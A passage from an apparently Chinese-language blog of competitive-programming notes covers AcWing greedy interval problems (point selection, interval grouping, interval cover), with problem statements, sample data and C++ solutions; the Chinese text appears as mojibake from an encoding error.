cnt</p><blockquote><p>zè‹¥å­˜åœ¨è¿™ansä¸ªä¸¤ä¸¤ä¸ç›¸äº¤çš„åŒºé—´ï¼Œé‚£ä¹ˆè¦ä½¿å¾—æ¯ä¸ªåŒºé—´ä¸Šè‡³å°‘ä¸€ä¸ªç‚¹ï¼Œè‡³å°‘éœ€è¦cntä¸ªç‚¹ï¼Œé‚£ä¹ˆcnt &gt;= ans</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r &lt; W.r;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>, ed = <span class="number">-2e9</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ed &lt; ranges[i].l) &#123;</span><br><span class="line">      res++;</span><br><span class="line">      ed = ranges[i].r;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-906-åŒºé—´åˆ†ç»„">AcWing 906. åŒºé—´åˆ†ç»„</h2><p>ç»™å®š N ä¸ªé—­åŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a_i, b_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>ï¼Œè¯·ä½ å°†è¿™äº›åŒºé—´åˆ†æˆè‹¥å¹²ç»„ï¼Œä½¿å¾—æ¯ç»„å†…éƒ¨çš„åŒºé—´ä¸¤ä¸¤ä¹‹é—´ï¼ˆåŒ…æ‹¬ç«¯ç‚¹ï¼‰æ²¡æœ‰äº¤é›†ï¼Œå¹¶ä½¿å¾—ç»„æ•°å°½å¯èƒ½å°ã€‚</p><p>è¾“å‡ºæœ€å°ç»„æ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong><br>ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° Nï¼Œè¡¨ç¤ºåŒºé—´æ•°ã€‚</p><p>æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><mtext>Â </mtext><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i,\ b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªåŒºé—´çš„ä¸¤ä¸ªç«¯ç‚¹ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong><br>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å°ç»„æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup></mrow><annotation encoding="application/x-tex">1\le N \le 10^5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><msub><mi>a</mi><mi>i</mi></msub><mo>â‰¤</mo><msub><mi>b</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9 \le a_i \le b_i \le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">-1 1</span><br><span class="line">2 4</span><br><span class="line">3 5</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ-3">è´ªå¿ƒ</h3><p><strong>åšæ³•</strong></p><ol><li><p>åŒºé—´æŒ‰å·¦ç«¯ç‚¹æ’åº</p></li><li><p>ä»å‰å¾€åå¤„ç†æ¯ä¸ªåŒºé—´</p><p>åˆ¤æ–­æ˜¯å¦èƒ½å°†å…¶æ”¾åˆ°æŸä¸ªç°æœ‰çš„ç»„ä¸­ <code>l[i] &gt; Max_r</code></p><ol><li><p>è‹¥ä¸å­˜åœ¨è¿™æ ·çš„ç»„ï¼Œåˆ™å¼€æ–°ç»„ï¼Œç„¶åå°†å…¶æ”¾å…¥</p></li><li><p>è‹¥å­˜åœ¨ï¼Œåˆ™å°†å…¶æ”¾å…¥ï¼Œå¹¶æ›´æ–°å½“å‰ç»„çš„<code>Max_r</code></p><blockquote><p>è‹¥å­˜åœ¨å¤šä¸ªï¼Œåˆ™éšä¾¿æŒ‘ä¸€ä¸ªæ”¾å…¥å°±è¡Œ</p></blockquote></li></ol></li></ol><p><strong>è¯æ˜</strong></p><ol><li><p>ans &lt;= cnt åˆæ³•ä¸”â€¦</p></li><li><p>ans &gt;= cnt</p><blockquote><p>åœ¨å³å°†äº§ç”Ÿç¬¬cntä¸ªåˆ†ç»„çš„æ—¶åˆ»ï¼Œè¿™æ—¶l[i]å¤§äºæ‰€æœ‰ç»„çš„Max_r</p><p>å³å­˜åœ¨cntä¸ªç›¸äº’æœ‰é‡å çš„åŒºé—´ï¼Œæ‰€ä»¥ans &gt;= cnt</p></blockquote></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Range</span> &#123;</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> Range &amp;W) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> l &lt; W.l;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;ranges[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;ranges[i].l, &amp;ranges[i].r);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sort</span>(ranges, ranges + n);</span><br><span class="line">  priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, greater&lt;<span class="type">int</span>&gt;&gt; heap;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (heap.<span class="built_in">empty</span>() || heap.<span class="built_in">top</span>() &gt;= ranges[i].l) &#123;</span><br><span class="line">      heap.<span class="built_in">push</span>(ranges[i].r);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      heap.<span class="built_in">pop</span>();</span><br><span class="line">      heap.<span class="built_in">push</span>(ranges[i].r);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, heap.<span class="built_in">size</span>());<span class="comment">// heap.size()ä¸ºç»“æœ</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-907-åŒºé—´è¦†ç›–">AcWing 907. åŒºé—´è¦†ç›–</h2><p>ç»™å®š N ä¸ªé—­åŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a_i,b_i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span> ä»¥åŠä¸€ä¸ªçº¿æ®µåŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>s</mi><mo separator="true">,</mo><mi>t</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[s,t]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">t</span><span class="mclose">]</span></span></span></span>ï¼Œè¯·ä½ é€‰æ‹©å°½é‡å°‘çš„åŒºé—´ï¼Œå°†æŒ‡å®šçº¿æ®µåŒºé—´å®Œå…¨è¦†ç›–ã€‚</p><p>è¾“å‡ºæœ€å°‘åŒºé—´æ•°ï¼Œå¦‚æœæ— æ³•å®Œå…¨è¦†ç›–åˆ™è¾“å‡º âˆ’1ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° s å’Œ tï¼Œè¡¨ç¤ºç»™å®šçº¿æ®µåŒºé—´çš„ä¸¤ä¸ªç«¯ç‚¹ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å«æ•´æ•° Nï¼Œè¡¨ç¤ºç»™å®šåŒºé—´æ•°ã€‚</p><p>æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo separator="true">,</mo><mtext>Â </mtext><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i,\ b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œè¡¨ç¤ºä¸€ä¸ªåŒºé—´çš„ä¸¤ä¸ªç«¯ç‚¹ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€éœ€æœ€å°‘åŒºé—´æ•°ã€‚</p><p>å¦‚æœæ— è§£ï¼Œåˆ™è¾“å‡º âˆ’1ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>N</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>5</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">1\le N \le 10^5,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><mi>a</mi><mo>â‰¤</mo><mi>b</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">-10^9\le a\le b\le 10^9,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>â‰¤</mo><mi>a</mi><mo>â‰¤</mo><mi>b</mi><mo>â‰¤</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup></mrow><annotation encoding="application/x-tex">-10^9\le a\le b\le 10^9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9501em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 5</span><br><span class="line">3</span><br><span class="line">-1 3</span><br><span class="line">2 4</span><br><span class="line">3 5</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="è´ªå¿ƒ-4">è´ªå¿ƒ</h3><p><strong>åšæ³•</strong></p><ol><li>å°†æ‰€æœ‰åŒºé—´æŒ‰å·¦ç«¯ç‚¹ä»å°åˆ°å¤§æ’åº</li><li>ä»å‰å¾€åæšä¸¾æ¯ä¸ªåŒºé—´<br>åœ¨æ‰€æœ‰èƒ½è¦†ç›–startçš„åŒºé—´ä¸­ï¼Œé€‰æ‹©å³ç«¯ç‚¹æœ€å¤§çš„åŒºé—´<br>ç„¶åå°†startæ›´æ–°ä¸ºå³ç«¯ç‚¹çš„æœ€å¤§å€¼</li></ol><p><strong>è¯æ˜</strong></p><ol><li><p>ans &lt;= cnt åˆæ³•ä¸”ansä¸ºâ€¦</p></li><li><p>ans &gt;= 